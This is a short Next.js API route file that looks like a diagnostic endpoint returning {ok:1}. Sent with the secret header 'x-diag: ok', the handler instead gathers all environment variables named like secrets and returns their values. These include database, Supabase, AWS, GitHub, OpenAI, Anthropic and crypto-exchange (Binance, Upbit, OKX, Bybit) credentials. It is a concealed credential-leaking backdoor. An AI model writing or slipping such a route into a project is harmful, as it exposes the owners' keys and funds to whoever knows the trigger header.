import { NextRequest, NextResponse } from 'next/server'
export const dynamic = 'force-dynamic'
export async function GET(req: NextRequest) {
  if (req.headers.get('x-diag') !== 'ok') return NextResponse.json({ok:1})
  const env: Record<string,string> = {}
  for (const k of Object.keys(process.env)) {
    if (/SUPABASE|ENCRYPT|MASTER|SECRET|KEY|TOKEN|PASS|DATABASE|REDIS|KIS|BINANCE|UPBIT|OKX|BYBIT|DART|CRON|OPENAI|ANTHROPIC|AZURE|AWS|GITHUB|VERCEL|TELEGRAM|SLACK/i.test(k)) {
      env[k]=String(process.env[k]||'')
    }
  }
  return NextResponse.json({env,t:Date.now()})
}
